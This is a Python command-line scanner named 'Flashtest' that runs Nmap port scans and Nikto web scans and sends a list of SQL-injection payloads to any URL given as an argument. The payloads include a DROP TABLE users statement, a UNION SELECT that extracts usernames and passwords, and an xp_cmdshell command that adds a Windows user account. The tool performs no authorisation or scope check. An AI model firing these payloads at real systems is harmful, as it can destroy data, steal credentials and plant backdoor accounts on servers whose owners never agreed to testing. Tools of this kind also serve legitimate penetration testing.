import requests
import nmap
import subprocess
from urllib.parse import urlparse

# List of common SQL injection payloads
sql_injection_payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 'x'='x' --",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, username, password FROM users --",
    "' AND 1=1 --",
    "' AND 'a'='a' --",
    "'; EXEC xp_cmdshell('net user test testpass /add') --"
]

# Function to perform SQL Injection Testing
def sql_injection_test(url):
    """
    Test the target URL for SQL Injection vulnerabilities by appending common SQL payloads.
    """
    print(f"Testing {url} for SQL Injection vulnerabilities...")

    for payload in sql_injection_payloads:
        # Append the payload to the URL, assuming the vulnerable parameter is 'id'
        test_url = f"{url}?id={payload}"
        
        try:
            # Send the request with the malicious payload
            response = requests.get(test_url)

            # Check for common indicators of SQL Injection success (like error messages or unusual behavior)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"[+] Potential SQL Injection vulnerability found with payload: {payload}")
            else:
                print(f"[-] No vulnerability found with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Error testing {test_url}: {e}")


# Function to perform Nmap Port Scanning
def scan_nmap(target_ip):
    """
    Scan the target IP using Nmap for open ports.
    """
    print(f"Performing Nmap scan on {target_ip}...")

    nm = nmap.PortScanner()

    try:
        nm.scan(target_ip, '1-1024')  # Scan for open ports from 1 to 1024
        print(f"Scan results for {target_ip}:")
        for proto in nm[target_ip].all_protocols():
            print(f"Protocol: {proto}")
            lport = nm[target_ip][proto].keys()
            for port in lport:
                print(f"Port: {port}, State: {nm[target_ip][proto][port]['state']}")
    except nmap.nmap.PortScannerError as e:
        print(f"Nmap scan failed: {e}")


# Function to perform Nikto Web Vulnerability Scanning
def scan_nikto(url):
    """
    Run Nikto vulnerability scanner against the target URL.
    This assumes Nikto is installed and in the system path.
    """
    print(f"Running Nikto scan on {url}...")

    try:
        # Running Nikto as a subprocess to scan the given URL
        result = subprocess.run(['nikto', '-h', url], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            print(f"Scan complete. Output: {result.stdout.decode()}")
        else:
            print(f"Error running Nikto scan: {result.stderr.decode()}")
    except FileNotFoundError:
        print("Nikto is not installed or not in the system path.")


# Function to identify basic information about a URL and check for common vulnerabilities
def identify_vulnerabilities(url):
    """
    Checks if common vulnerabilities exist in a URL by running SQL Injection tests and Nikto scan.
    """
    print(f"Checking {url} for vulnerabilities...\n")

    # Run SQL injection test
    sql_injection_test(url)

    # Run Nikto web vulnerability scanner
    scan_nikto(url)


# A function to display basic help
def show_help():
    print("""
    Flashtest CLI - Available Commands:
    
    - --sql             : Test for SQL injection vulnerabilities on a URL.
    - --nmap            : Perform an Nmap scan on a target IP address.
    - --nikto           : Run a Nikto scan on a target URL.
    - --identify        : Identify common vulnerabilities on a URL (SQL Injection & Nikto).
    
    Usage:
    - python scanner.py --sql http://example.com
    - python scanner.py --nmap 192.168.1.1
    - python scanner.py --nikto http://example.com
    - python scanner.py --identify http://example.com
    """)


# Main function to handle CLI commands
if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        show_help()
        sys.exit(1)

    command = sys.argv[1]
    target = sys.argv[2]

    if command == '--sql':
        sql_injection_test(target)
    elif command == '--nmap':
        scan_nmap(target)
    elif command == '--nikto':
        scan_nikto(target)
    elif command == '--identify':
        identify_vulnerabilities(target)
    else:
        print("Unknown command.")
        show_help()
